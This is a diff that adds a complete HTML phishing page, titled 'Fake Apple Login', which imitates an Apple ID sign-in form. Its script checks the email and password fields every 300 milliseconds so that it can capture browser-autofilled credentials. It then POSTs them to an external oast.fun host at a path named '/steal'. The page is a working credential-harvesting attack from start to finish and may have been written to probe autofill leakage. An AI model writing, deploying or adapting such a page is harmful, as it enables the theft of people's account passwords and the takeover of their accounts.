@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Fake Apple Login</title>
+</head>
+<body>
+  <h2>🔒 Apple ID Login Required</h2>
+  <form id="login-form">
+    <input type="email" id="email" name="email" placeholder="Email / Apple ID" autocomplete="on"><br>
+    <input type="password" id="pass" name="pass" placeholder="Password" autocomplete="on"><br>
+    <button>Login</button>
+  </form>
+
+  <script>
+    function exfiltrate() {
+      const email = document.getElementById("email").value;
+      const pass = document.getElementById("pass").value;
+
+      if (email && pass) {
+        fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/steal", {
+          method: "POST",
+          body: JSON.stringify({ email, pass }),
+          headers: { "Content-Type": "application/json" }
+        });
+      }
+    }
+
+    // Delay polling — catch autofill after gesture (e.g., click key icon)
+    setInterval(() => {
+      const e = document.getElementById("email");
+      const p = document.getElementById("pass");
+      if (e.value && p.value) {
+        exfiltrate();
+      }
+    }, 300); // polling every 300ms
+  </script>
+</body>
+</html>
